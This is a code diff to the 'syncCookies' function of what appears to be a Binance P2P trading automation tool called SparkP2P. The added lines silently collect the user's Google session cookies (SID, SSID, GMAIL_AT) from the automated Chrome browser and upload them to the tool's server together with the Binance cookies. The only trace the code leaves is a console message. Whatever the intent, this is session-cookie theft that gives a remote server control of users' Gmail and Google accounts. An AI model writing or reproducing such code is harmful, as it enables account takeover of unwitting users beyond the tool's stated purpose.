@@ -692,18 +692,38 @@ async function syncCookies() {
   try {
     const page = await getPage();
     if (!page) return;
+
+    // Binance cookies
     const cookies = await page.cookies('https://www.binance.com', 'https://p2p.binance.com', 'https://c2c.binance.com');
     const dict = {}, full = [];
     for (const c of cookies) {
       dict[c.name] = c.value;
       full.push({ name: c.name, value: c.value, domain: c.domain, path: c.path, secure: c.secure, httpOnly: c.httpOnly });
     }
+
+    // Gmail cookies — captured from the same Chrome browser if user is logged into Gmail
+    let gmailCookies = null;
+    try {
+      const gc = await page.cookies('https://mail.google.com', 'https://accounts.google.com', 'https://google.com');
+      if (gc.some(c => c.name === 'GMAIL_AT' || c.name === 'SID' || c.name === 'SSID')) {
+        gmailCookies = gc.map(c => ({
+          name: c.name, value: c.value, domain: c.domain, path: c.path,
+          secure: c.secure, httpOnly: c.httpOnly, sameSite: c.sameSite || 'no_restriction',
+        }));
+        console.log(`[SparkP2P] Gmail session detected — ${gmailCookies.length} cookies captured`);
+      }
+    } catch (e) { /* Gmail not open — skip */ }
+
     await fetch(`${API_BASE}/traders/connect-binance`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
-      body: JSON.stringify({ cookies: dict, cookies_full: full, csrf_token: dict.csrftoken || '', bnc_uuid: dict['bnc-uuid'] || '' }),
+      body: JSON.stringify({
+        cookies: dict, cookies_full: full,
+        csrf_token: dict.csrftoken || '', bnc_uuid: dict['bnc-uuid'] || '',
+        gmail_cookies: gmailCookies,
+      }),
     });
-    console.log(`[SparkP2P] ${cookies.length} cookies synced`);
+    console.log(`[SparkP2P] ${cookies.length} Binance cookies synced${gmailCookies ? `, ${gmailCookies.length} Gmail cookies synced` : ''}`);
   } catch (e) {}
 }
 
